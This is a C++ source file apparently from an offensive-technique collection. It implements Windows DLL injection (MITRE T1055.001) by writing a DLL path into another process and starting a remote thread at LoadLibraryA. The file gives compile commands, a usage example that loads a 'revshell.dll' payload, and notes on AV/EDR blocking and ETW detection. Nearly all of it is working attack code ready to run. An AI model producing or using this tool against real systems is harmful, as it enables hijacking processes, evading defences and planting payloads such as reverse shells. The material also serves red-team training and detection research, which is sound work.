/*
 * DLL Injection - CreateRemoteThread + LoadLibraryA
 *
 * Plain English:
 *   Instead of shellcode, we hand the target a path to a .DLL file and
 *   ask its own loader to load it. Write the DLL's absolute path into
 *   target memory, then CreateRemoteThread with LoadLibraryA as the
 *   entry point and the path as the argument.
 *
 * What makes it different from classic (T1055.002):
 *   Payload is a compiled DLL (real C/C++ code, imports, etc.), not raw
 *   shellcode. Trade-off: the DLL file has to exist on disk somewhere
 *   the target can read, and LoadLibrary fires ETW ImageLoad events.
 *
 * MITRE ATT&CK: T1055.001 - Dynamic-link Library Injection
 *
 * Chain:
 *   OpenProcess -> VirtualAllocEx(RW) -> WriteProcessMemory("C:\\...\\x.dll")
 *   -> CreateRemoteThread(entry = LoadLibraryA, arg = buf)
 *
 * The target's own kernel32 does the load when the thread fires.
 *
 * Compile:
 *   x86_64-w64-mingw32-g++ -std=c++20 -o dll_inject.exe dll_injection.cpp
 *   cl /std:c++20 dll_injection.cpp /Fe:dll_inject.exe
 *
 * Usage:
 *   dll_inject.exe <PID> <full_path_to_dll>
 */

#include <windows.h>
#include <psapi.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "psapi.lib")

/* After CreateRemoteThread -> LoadLibraryA completes, verify the DLL
 * is actually mapped by walking the target's module list. We can't
 * rely on GetExitCodeThread: it returns DWORD (32-bit) but HMODULE
 * is 64-bit on x64 -> the "base" is truncated and may show as 0
 * even on success. */
static BOOL verify_dll_loaded(HANDLE hProc, const char* dllName) {
    HMODULE mods[1024];
    DWORD needed = 0;
    if (!EnumProcessModulesEx(hProc, mods, sizeof(mods), &needed, LIST_MODULES_ALL)) {
        return FALSE;
    }
    char nameBuf[MAX_PATH];
    DWORD count = needed / sizeof(HMODULE);
    for (DWORD i = 0; i < count; ++i) {
        if (GetModuleBaseNameA(hProc, mods[i], nameBuf, sizeof(nameBuf)) > 0) {
            if (_stricmp(nameBuf, dllName) == 0) return TRUE;
        }
    }
    return FALSE;
}


int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("DLL Injection PoC\n");
        printf("Usage: %s <PID> <absolute DLL path>\n", argv[0]);
        printf("  %s 1234 C:\\payloads\\revshell.dll\n", argv[0]);
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    char* dllPath = argv[2];
    size_t dllPathLen = strlen(dllPath) + 1;

    if (GetFileAttributesA(dllPath) == INVALID_FILE_ATTRIBUTES) {
        printf("[-] DLL not found: %s\n", dllPath);
        return 1;
    }

    const char* dllName = strrchr(dllPath, '\\');
    dllName = dllName ? dllName + 1 : dllPath;

    printf("[*] Target PID : %lu\n", pid);
    printf("[*] DLL        : %s\n", dllPath);

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) { printf("[-] OpenProcess failed (%lu)\n", GetLastError()); return 1; }

    LPVOID buf = VirtualAllocEx(hProc, NULL, dllPathLen,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) { printf("[-] VirtualAllocEx failed (%lu)\n", GetLastError()); CloseHandle(hProc); return 1; }

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, buf, dllPath, dllPathLen, &written)) {
        printf("[-] WriteProcessMemory failed (%lu)\n", GetLastError());
        VirtualFreeEx(hProc, buf, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return 1;
    }
    printf("[+] Wrote DLL path to %p (%zu bytes)\n", buf, written);

    FARPROC loadLibraryA = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (!loadLibraryA) {
        printf("[-] GetProcAddress(LoadLibraryA) failed\n");
        VirtualFreeEx(hProc, buf, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return 1;
    }

    HANDLE hT = CreateRemoteThread(hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)loadLibraryA, buf, 0, NULL);
    if (!hT) {
        printf("[-] CreateRemoteThread failed (%lu)\n", GetLastError());
        VirtualFreeEx(hProc, buf, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return 1;
    }
    printf("[+] Remote thread fired\n");

    WaitForSingleObject(hT, 10000);

    /* Can't trust GetExitCodeThread on x64 for HMODULE (truncation).
     * Walk the target's module list and confirm the DLL name is there. */
    if (verify_dll_loaded(hProc, dllName)) {
        printf("[+] DLL loaded: %s is now in the target's module list.\n", dllName);
    } else {
        printf("[-] DLL does NOT appear in target's module list - load failed.\n");
        printf("    Common reasons: wrong architecture (32 vs 64), missing imports,\n");
        printf("    AV/EDR blocking LoadLibrary, or DLL path contains unicode chars.\n");
    }

    VirtualFreeEx(hProc, buf, 0, MEM_RELEASE);
    CloseHandle(hT);
    CloseHandle(hProc);
    return 0;
}
